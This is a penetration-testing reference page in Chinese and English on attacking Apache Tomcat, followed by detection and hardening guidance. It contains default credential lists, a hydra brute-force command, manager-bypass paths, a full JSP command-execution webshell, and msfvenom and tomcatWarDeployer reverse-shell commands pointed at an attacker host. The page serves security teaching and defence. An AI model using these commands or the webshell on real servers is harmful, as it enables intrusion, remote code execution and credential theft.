---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 远程代码执行
  - 信息泄露
  - 权限提升
risk_level: 高
prerequisites:
  - HTTP Protocol Basics
  - Java Web Application Structure (WAR, Servlet, JSP)
  - Basic Authentication
related_techniques:
  - file-upload
  - waf-bypass
  - parameter-pollution
  - java-deserialization
  - path-traversal
difficulty: 中级
tools:
  - metasploit
  - hydra
  - msfvenom
  - clusterd
  - tomcatwardeployer
---

# Tomcat — Apache Tomcat Attack Surface — Tomcat 攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [Java Deserialization](../../../User%20input/Structured%20objects/Deserialization/README.md) · [JBoss](../JBoss/README.md)

---

### 知识路径

```
Tomcat Security (this document)
  ├── Prerequisite: Java Web Applications — WAR structure, Servlet API, JSP
  ├── Prerequisite: HTTP Basic Authentication
  ├── Next: AJP Protocol Attacks (Ghostcat CVE-2020-1938)
  ├── Next: Java Deserialization in Tomcat context
  │   └── See: User input/Structured objects/Deserialization
  ├── Related: File Upload — Axis2 SOAP → Tomcat webroot JSP drop
  │   └── See: Files/File Upload
  ├── Related: WAF Bypass — Tomcat path parsing differences
  │   └── See: Proxies/Proxy & WAF Protections Bypass
  ├── Related: Parameter Pollution — Spring MVC + Tomcat comma concatenation
  │   └── See: Other Helpful Vulnerabilities/Parameter Pollution
  └── Related: JBoss — same Java app server category
      └── See: Web Servers & Middleware/JBoss
```

---

# 0x01 Tomcat Attack Surface — Principles & Classification

## 1.1 Tomcat Architecture Overview

Apache Tomcat is an open-source Java Servlet container implementing Jakarta Servlet, Jakarta Server Pages (JSP), Jakarta Expression Language, and Jakarta WebSocket specifications. Its attack surface spans:

- **HTTP Connector** — Listens on port 8080 by default (Coyote HTTP/1.1). Also supports NIO, NIO2, APR/native. Parsing differences between connectors create attack surface (e.g., path normalization bypasses).
- **AJP Connector** — Binary protocol on port 8009 between reverse proxy (Apache httpd / Nginx) and Tomcat. Historically vulnerable: CVE-2020-1938 (Ghostcat) allows unauthenticated file read/RCE via arbitrary AJP packet injection.
- **Manager Applications** — `/manager/html` (GUI), `/manager/text` (API), `/host-manager/html`. Protected by Basic auth; credentials in `tomcat-users.xml`. Successful login → WAR deployment → RCE.
- **Default Applications** — `/examples`, `/docs`, `/host-manager`, `/manager` shipped in default install. `/examples` contains information-leaking servlets and XSS-vulnerable JSP pages.
- **Servlet Engine (Catalina)** — Core servlet container. URL parsing logic in `org.apache.catalina` is the source of path traversal bypasses (`/..;/`, `;param=value`).
- **Deployment Pipeline** — Hot-deployment of WAR files to `webapps/` directory. A writable `webapps/` (via PUT method or filesystem access) enables direct webshell deployment.

Default ports:

| Port | Service |
|------|---------|
| 8080 | HTTP Connector (default) |
| 8443 | HTTPS Connector |
| 8009 | AJP Connector |
| 8005 | Shutdown port (binds to 127.0.0.1) |

## 1.2 Attack Surface Taxonomy

| Category | Taxonomy | Examples |
|----------|----------|----------|
| Configuration Weakness | 配置缺陷 | Default credentials, /examples shipped in production, writable webapps, manager accessible without IP restriction |
| Authentication/Authorization Bypass | 认证/授权绕过 | Path traversal bypass to manager (`/..;/manager/html`), double URL encoding (CVE-2007-1860 mod_jk) |
| Information Disclosure | 信息泄露 | /examples servlets, /docs version disclosure, /manager/status, password in backtrace via auth.jsp |
| Injection | 注入类 | WAR deployment (arbitrary code in JSP/servlet), path traversal in SOAP upload to Tomcat webroot |
| Parsing Discrepancy | 协议解析差异 | `;` path delimiter confusion (Tomcat vs reverse proxy), `;param=value` path segment bypass |

## 1.3 Version Landscape

| Version | Key Changes |
|---------|-------------|
| Tomcat 4.x – 6.x | Username enumeration possible via `tomcat_enum`. CVE-2007-1860 (double URL encoding in mod_jk). /examples shipped by default. |
| Tomcat 7.x | /examples still present. Path traversal `/..;/` bypass effective against reverse proxy mappings. `manager-gui` role introduced. |
| Tomcat 8.x – 9.x | AJP enabled by default until 9.0.31. CVE-2020-1938 (Ghostcat) — arbitrary file read via AJP. AJP disabled by default since 9.0.31. |
| Tomcat 10.x | Jakarta EE 9 migration (`javax.*` → `jakarta.*`). AJP disabled by default. Default apps still shipped in some distributions. |

---

# 0x02 Reconnaissance & Enumeration

## 2.1 Discovery

Tomcat typically runs on **port 8080** (HTTP) and **8443** (HTTPS). A common Tomcat error page confirms the server identity:

[图片: Tomcat 404 error page — Tesseract extracted: "TTP Status 404 — Not Found |Apache Tomca"]

## 2.2 Version Identification

```bash
# Grep the /docs index page for version in <title>
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```

The version string appears in the HTML `<title>` tag of the documentation index.

The `/manager/status` page (when accessible) displays both **Tomcat version** and **OS version**, aiding vulnerability correlation.

## 2.3 Manager Files Location

`/manager` and `/host-manager` directory names may be altered. A brute-force search is recommended to locate these pages:

```bash
# Common paths to check
/manager/html
/manager/text
/manager/status
/host-manager/html
/admin
/manager/html/../;/manager/html  # path traversal bypass
```

## 2.4 Username Enumeration (Tomcat < 6)

For Tomcat versions older than 6, username enumeration is possible:

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

> **Limitation:** This technique is effective only against Tomcat versions prior to 6. Newer versions do not leak username validity in authentication responses.

## 2.5 Default Credentials

The `/manager/html` directory is protected by HTTP Basic Authentication. Common default credentials:

```
admin:admin
tomcat:tomcat
admin:<blank>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

Automated credential testing:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

## 2.6 Brute Force Attack

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

Metasploit equivalent provides session-aware credential testing with configurable delay and stop-on-success behavior.

---

# 0x03 Information Disclosure & Access Bypass

## 3.1 Password Backtrace Disclosure

Accessing `/auth.jsp` in certain configurations may reveal the password in a Java exception stack trace. This occurs when the authentication mechanism throws an unhandled exception that includes sensitive parameters in the backtrace output.

> **Condition:** Requires `auth.jsp` to be present and the application to be configured with debug-level error output. Not present in default Tomcat installations — typically found in custom web applications deployed on Tomcat.

## 3.2 Double URL Encoding Path Traversal (CVE-2007-1860)

### 3.2.1 Mechanism

The `mod_jk` connector (Apache httpd ↔ Tomcat) performs URL decoding before forwarding requests. Double-encoding a path traversal sequence causes `mod_jk` to decode once → pass the traversal, then Tomcat decodes again → processes the traversed path.

### 3.2.2 Exploitation

```
# Double-encoded traversal to reach manager without authentication
pathTomcat/%252E%252E/manager/html
```

Decoding chain: `%252E%252E` → `%2E%2E` → `..`

> **Affected:** mod_jk connector in Tomcat 4.x – 6.x era. Requires `mod_jk` to be the front-end connector.

## 3.3 /examples Directory Information Disclosure & XSS

### 3.3.1 Mechanism

Apache Tomcat versions 4.x through 7.x include example scripts in the `/examples` directory that expose internal application state and are susceptible to Cross-Site Scripting (XSS). These are shipped in the default installation and often left in production.

### 3.3.2 Exposed Endpoints

JSP examples (information-leaking):

```
/examples/jsp/num/numguess.jsp       — Session state disclosure
/examples/jsp/dates/date.jsp         — Server date/time
/examples/jsp/snp/snoop.jsp          — Request/header/session dump (most dangerous)
/examples/jsp/error/error.html       — Error page example
/examples/jsp/sessions/carts.html    — Session tracking demo
/examples/jsp/checkbox/check.html    — Form processing example
/examples/jsp/colors/colors.html     — Color preferences demo
/examples/jsp/cal/login.html         — Calendar login example
/examples/jsp/include/include.jsp    — Server-side include example
/examples/jsp/forward/forward.jsp    — Request forwarding example
/examples/jsp/plugin/plugin.jsp      — Applet plugin example
/examples/jsp/jsptoserv/jsptoservlet.jsp — JSP-to-Servlet lifecycle info
/examples/jsp/simpletag/foo.jsp      — Custom tag example
/examples/jsp/mail/sendmail.jsp      — SMTP mail sending (abuse potential)
```

Servlet examples (request/environment introspection):

```
/examples/servlet/HelloWorldExample      — Basic servlet
/examples/servlet/RequestInfoExample     — Request parameter dump
/examples/servlet/RequestHeaderExample   — HTTP header reflection
/examples/servlet/RequestParamExample    — GET/POST parameter echo
/examples/servlet/CookieExample          — Cookie set/get
/examples/servlet/JndiServlet            — JNDI context listing
/examples/servlet/SessionExample         — Session attribute display
```

Tomcat documentation sample:

```
/tomcat-docs/appdev/sample/web/hello.jsp
```

> **Reference:** [Rapid7 — Apache Tomcat Example Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

## 3.4 Path Traversal Bypass via Path Delimiter Confusion

### 3.4.1 `/..;/` Traversal

In [vulnerable Tomcat + reverse proxy configurations](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/), the path segment `/..;/` is interpreted differently by the reverse proxy and Tomcat:

```
# Reverse proxy sees: /lalala/..;/manager/html → normalizes to /manager/html (blocks it)
# But forwards literal path to Tomcat
# Tomcat's Catalina servlet engine treats ; as path parameter delimiter
# → /lalala/.. is the path, ;/manager/html is a parameter
# → Resolves to /manager/html — bypasses proxy ACL
www.vulnerable.com/lalala/..;/manager/html
```

### 3.4.2 `;param=value` Segment Bypass

An alternative form using a path parameter in the root segment:

```
http://www.vulnerable.com/;param=value/manager/html
```

Tomcat's `org.apache.catalina.connector.CoyoteAdapter` parses `;param=value` as a path parameter attached to the root `/`, preserving access to the intended path after the semicolon segment. This bypasses reverse proxy rules that match on the literal path prefix.

This same parsing behavior is why Tomcat appears in [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) contexts — the `;` acts as a path delimiter in Tomcat but not in front-end proxies, creating filter bypass opportunities. The [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) behavior of Spring MVC + Tomcat (comma-concatenation of duplicate parameters) compounds this in many deployments.

---

# 0x04 Remote Code Execution

## 4.1 WAR File Deployment via Manager

### 4.1.1 Mechanism

The Tomcat Web Application Manager allows authenticated users to upload and deploy WAR (Web Application Archive) files. A WAR containing a JSP webshell provides immediate command execution under the Tomcat process identity.

### 4.1.2 Prerequisites

- Valid credentials for a user with one of these roles: **manager-gui**, **manager-script**, **admin**
- Roles are defined in `tomcat-users.xml` (see §5.1)
- The manager application must be accessible (not IP-restricted or removed)

### 4.1.3 Deploy via API (manager/text)

```bash
# Deploy a WAR under a given context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# Undeploy / cleanup
curl "http://tomcat:password@localhost:8080/manager/text/undeploy?path=/monshell"
```

### 4.1.4 Limitations

- `tomcat6-admin` (Debian) or `tomcat6-admin-webapps` (RHEL) must be installed for manager access
- User must have appropriate role (`manager-gui` for HTML interface, `manager-script` for text API). Roles are defined in `tomcat-users.xml` — path varies by distribution and version. See [§5.1.1](#511-file-discovery) for the full path table.
- Some Tomcat packaging (e.g., minimal Docker images) strip the manager application entirely

## 4.2 Metasploit Module

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

This module automates WAR generation, deployment, payload execution, and cleanup.

## 4.3 MSFVenom JSP Reverse Shell

```bash
# Generate WAR containing JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
```

Upload `revshell.war` via the manager GUI or API, then trigger the payload by accessing `http://target:8080/revshell/`.

## 4.4 tomcatWarDeployer.py

[tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) is a dedicated Python script for WAR deployment with built-in reverse and bind shell payloads:

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

**Reverse shell:**

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

**Bind shell:**

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

> **Note:** Some older Java/OS combinations (particularly legacy Sun JVM versions) may fail to execute the payload properly.

## 4.5 clusterd Automated Exploitation

[clusterd](https://github.com/hatRiot/clusterd) provides automated exploitation for multiple application servers including Tomcat:

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

## 4.6 Manual JSP Web Shell Deployment

### 4.6.1 Basic Command Shell (index.jsp)

Create `index.jsp` with the following content (from [tennc/fuzzdb webshell collection](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)):

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Package and deploy:

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
# webshell.war is created — upload via manager
```

### 4.6.2 Quick WAR from Remote Shell

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# Upload to manager GUI → application deployed at /backup
# Access shell at: http://tomcat-site.local:8180/backup/cmd.jsp
```

### 4.6.3 Alternative: filebrowser.war

Install the [vonLoesch filebrowser](http://vonloesch.de/filebrowser.html) WAR for a full-featured file management, upload, download, and command execution interface through the Tomcat manager.

---

# 0x05 Post-Exploitation & Credential Harvesting

## 5.1 tomcat-users.xml Location & Structure

### 5.1.1 File Discovery

```bash
find / -name tomcat-users.xml 2>/dev/null
```

Common locations:

| Distribution | Path |
|-------------|------|
| Debian/Ubuntu (Tomcat 9) | `/usr/share/tomcat9/etc/tomcat-users.xml` |
| RHEL/CentOS | `/etc/tomcat/tomcat-users.xml` |
| Manual/Docker | `$CATALINA_HOME/conf/tomcat-users.xml` |
| Windows | `C:\Program Files\Apache Software Foundation\Tomcat <ver>\conf\tomcat-users.xml` |

### 5.1.2 File Structure

```xml
[...]
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only
-->
[...]
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

### 5.1.3 Role Privileges

| Role | Access |
|------|--------|
| `manager-gui` | HTML GUI + status pages |
| `manager-script` | HTTP text API + status pages (minimal for programmatic deployment) |
| `manager-jmx` | JMX proxy + status pages |
| `manager-status` | Status pages only (read-only) |
| `admin-gui` | `/host-manager/html` — virtual host management |

> **Post-exploitation value:** Harvested `tomcat-users.xml` credentials may be reused across environments. The `manager-script` role alone is sufficient for WAR deployment via the `/manager/text` API — no GUI access required.

---

# 0x06 Defense, Hardening & Tools

## 6.1 Detection Methodology

### 6.1.1 Network Telemetry

| Indicator | Significance |
|-----------|--------------|
| `PUT` or `POST` to `/manager/text/deploy` | WAR deployment via API |
| Requests to `/examples/servlet/`, `/examples/jsp/snp/snoop.jsp` | /examples information gathering |
| Paths containing `%252E` (double-encoded `.`) | CVE-2007-1860 / mod_jk traversal |
| Paths containing `/..;/` or `/;param=value/` segments | Path traversal bypass attempt |
| `POST /manager/html/upload` with `.war` multipart | WAR upload via GUI |
| Multiple `401` responses to `/manager/html` followed by `200` | Credential brute force |

### 6.1.2 Host-Based Indicators

| Indicator | Significance |
|-----------|--------------|
| New `.war` files in `webapps/` not matching deployment timeline | Unauthorized application deployment |
| Auto-extracted web application directories in `webapps/` (e.g., `/backup/`, `/monshell/`) | WAR deployment artifacts |
| `.jsp` files containing `Runtime.getRuntime().exec()` | JSP webshell |
| Unauthorized entries in `tomcat-users.xml` (`manager-gui` or `manager-script` roles) | Persistent backdoor account |
| `$CATALINA_HOME/webapps/` writable by non-Tomcat users | Filesystem permission weakness |

## 6.2 Hardening Checklist

### 6.2.1 Configuration Hardening

| Action | Rationale |
|--------|-----------|
| Remove `/examples`, `/docs`, `/host-manager` in production | Eliminates information disclosure endpoints |
| Delete default `tomcat-users.xml` and create from scratch | Removes default credential assumptions |
| Restrict `/manager` access by IP via `RemoteAddrValve` in `context.xml` | Limits manager access to trusted networks |
| Set `<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127.0.0.1, 192.168.1.0/24"/>` | IP whitelisting for manager |
| Use strong, unique passwords for all `tomcat-users.xml` entries | Prevents credential brute force |
| Assign only the minimum required role to each user (`manager-script` over `manager-gui`) | Principle of least privilege |
| Disable AJP connector (`server.xml`) if not needed | Mitigates AJP-based attacks (Ghostcat) |
| Bind AJP to `127.0.0.1` only if reverse proxy is on same host | Limits AJP exposure |
| Run Tomcat as unprivileged OS user (not root) | Limits impact of RCE |
| Set `<Server port="-1" ...>` to disable shutdown port (8005) | Prevents shutdown command abuse |
| Remove default `ROOT` webapp or replace with custom landing page | Reduces information leakage |

### 6.2.2 Monitoring & Response

| Action | Rationale |
|---------|-----------|
| Enable Tomcat Access Log Valve with full request URI and response code | Visibility into exploitation attempts |
| Monitor `catalina.out` for `RuntimeException` in `/manager` context | Detect exploit failures/successes |
| Alert on new WAR deployment events (JMX notification or log parsing) | Real-time deployment detection |
| Run periodic `find $CATALINA_HOME/webapps -name "*.jsp" -newer <baseline>` | Detect new webshell files |
| Keep Tomcat updated (subscribe to `announce@tomcat.apache.org`) | Address CVEs promptly |

## 6.3 Tools Inventory

| Tool | Purpose | Reference |
|------|---------|-----------|
| `tomcat_mgr_login` (MSF) | Credential brute force | `auxiliary/scanner/http/tomcat_mgr_login` |
| `tomcat_enum` (MSF) | Username enumeration (Tomcat <6) | `auxiliary/scanner/http/tomcat_enum` |
| `tomcat_mgr_upload` (MSF) | Automated WAR deployment + RCE | `exploit/multi/http/tomcat_mgr_upload` |
| `tomcatWarDeployer.py` | Python WAR deployer with rev/bind shell payloads | [github.com/mgeeky/tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) |
| `clusterd` | Multi-app-server exploitation framework | [github.com/hatRiot/clusterd](https://github.com/hatRiot/clusterd) |
| `ApacheTomcatScanner` | Tomcat-specific vulnerability scanner | [github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) |
| `hydra` | Generic HTTP brute force | Built-in |
| `msfvenom` | WAR payload generation (`java/jsp_shell_reverse_tcp`) | Built-in |

## 参考资料

- [HackTricks — Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Rapid7 — Apache Tomcat Example Script Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
- [Acunetix — Tomcat Path Traversal via Reverse Proxy Mapping](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
- [mgeeky — tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)
- [hatRiot — clusterd](https://github.com/hatRiot/clusterd)
- [p0dalirius — ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)
- [tennc — JSP Webshell (fuzzdb)](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
- [Pentest-Tomcat (Reference Guide)](https://github.com/simran-sankhala/Pentest-Tomcat)
- [Tomcat Security Considerations (Official)](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
